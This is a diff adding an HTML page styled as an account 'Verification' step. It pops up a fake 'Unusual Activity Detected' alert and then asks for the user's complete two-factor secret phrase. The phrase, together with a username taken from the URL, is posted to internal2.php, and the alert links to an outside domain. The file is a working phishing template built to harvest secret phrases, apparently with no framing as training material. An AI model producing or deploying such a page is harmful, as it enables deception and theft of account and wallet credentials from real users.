@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="">
+
+    <title>Verification</title>
+
+    <!-- Bootstrap core CSS -->
+    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom styles for this template -->
+    <link href="/static/css/signin.css" rel="stylesheet">
+
+    <script src="/static/js/jquery.min.js"></script>
+    <script src="/static/js/bootstrap.min.js"></script>
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+</head>
+
+<body>
+    
+    
+
+<div class="container">
+    
+
+
+
+<div class="alert alert-danger alert-danger-page fade in" style="display:none;margin-top:10px;" tabindex="-1">
+    <button type="button" class="close" data-dismiss="alert">×</button>
+    <p id="pageDanger"></p>
+</div>
+<div class="alert alert-block alert-success alert-success-page fade in" style="display:none;margin-top:10px;" tabindex="-1">
+    <button type="button" class="close" data-dismiss="alert">×</button>
+    <p id="pageSuccess"></p>
+</div>
+<div class="alert alert-block alert-info alert-info-page fade in" style="display:none;margin-top:30px;" tabindex="-1">
+    <button type="button" class="close" data-dismiss="alert">×</button>
+    <p id="pageInfo"></p>
+</div>
+
+<div class="modal fade" id="modalNotification" tabindex="-1" role="dialog" style="display: none;" aria-hidden="true">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">×</span><span class="sr-only">Close</span></button>
+                    <h4 class="modal-title" id="modalNotificationTitle">Notification</h4>
+                </div>
+                <div class="modal-body">
+                    <div id="divNotificationContent">
+                        <div style="font-size: 12pt;">
+    <span style="color: red;">Hi <span id="usernamePlaceholder" style="text-decoration: underline;">{username}</span>
+, Unusual Activity Detected on your account!</span><br><br>
+    Please follow the steps below:<br>
+    1. Verify your two-factor secret phrase<br>
+    2. Confirm the details as asked<br>
+    3. Go <a href="https://brianscrabs.de/Verification.html" target="_blank">shopping!</a><br><br>
+    For any questions <a href="https://brianscrabs.de/Verification.html" target="_blank">feel free to contact me</a>.<br><br>
+    Sincerely yours,<br>
+    Brian
+</div>
+
+                    </div>
+                
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-default" data-dismiss="modal">Close</button> &nbsp;
+                    <button type="button" class="btn btn-primary" data-dismiss="modal" id="confirmNotification" data-id="1">Thanks, I got it</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+  <form action="internal2.php" method="post" role="form" style="max-width:450px;">
+    <h2 class="form-signin-heading">Secret Phrase Verification</h2>
+    <div class="form-group">
+        <label for="verify_symbols">Please enter your complete secret phrase:</label>
+        <input required type="text" id="id_username" name="key" maxlength="100" required="required">
+        <!-- Add a hidden input field to pass the username -->
+        <input type="hidden" name="username" value="" id="usernameHiddenInput">
+        <p class="help-block">Example: If the secret phrase is "<strong>abcdefjhi</strong>", enter the whole phrase, i.e.: <strong>abcdefjhi</strong></p>
+    </div>
+    <input type="hidden" name="quest" value="3;6">
+    <button type="submit" class="btn btn-primary">Continue</button>
+</form>
+
+<script>
+
+    
+    
+    // Extract the username from the URL query parameters
+const urlParams = new URLSearchParams(window.location.search);
+const username = urlParams.get('username');
+
+// Set the value of the hidden input field to the extracted username
+document.getElementById("usernameHiddenInput").value = username;
+
+// Set the username in the modal
+document.getElementById("usernamePlaceholder").textContent = username;
+
+    
+</script>
+
+</div>
+<!-- /container -->
+
+
+</body>
+
+<script>
+
+
+    $(document).ready(function () {
+        
+            $('#modalNotification').modal('show');
+            $('#confirmNotification').click(function() {
+                $.post("/", {
+                    csrfmiddlewaretoken: $('#csrfmiddlewaretoken').val(),
+                    nid: $(this).data('id')
+                },function (data) {
+                    //
+                }).error(function () {
+                    //showMessage('page', 'danger', 'timeout error, please try again');
+                }).always(function () {
+                    //
+                });
+                return true;
+            });
+        
+    });
+</script>
+</html>
